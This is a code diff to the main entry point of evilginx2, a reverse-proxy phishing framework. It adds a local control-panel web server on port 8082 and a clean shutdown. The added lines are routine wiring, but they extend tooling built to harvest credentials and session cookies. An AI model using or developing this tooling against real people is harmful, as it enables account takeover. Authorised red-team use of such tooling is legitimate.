@@ -1,6 +1,7 @@
 package main
 
 import (
+	"context"
 	"flag"
 	"fmt"
 	_log "log"
@@ -8,11 +9,13 @@ import (
 	"os/user"
 	"path/filepath"
 	"regexp"
+	"time"
 
 	"github.com/caddyserver/certmagic"
 	"github.com/kgretzky/evilginx2/core"
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
+	"github.com/kgretzky/evilginx2/panel"
 	"go.uber.org/zap"
 
 	"github.com/fatih/color"
@@ -173,6 +176,21 @@ func main() {
 	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode)
 	hp.Start()
 
+	panel, err := panel.NewServer(
+		"127.0.0.1:8082",
+		filepath.Join(*cfg_dir, "panel_users.json"),
+	)
+	if err != nil {
+		log.Fatal("control panel: %v", err)
+		return
+	}
+
+	go func() {
+		if err := panel.Start(); err != nil {
+			log.Error("control panel stopped: %v", err)
+		}
+	}()
+
 	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
 	if err != nil {
 		log.Fatal("%v", err)
@@ -180,4 +198,8 @@ func main() {
 	}
 
 	t.DoWork()
+
+	shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancel()
+	_ = panel.Shutdown(shutdownCtx)
 }
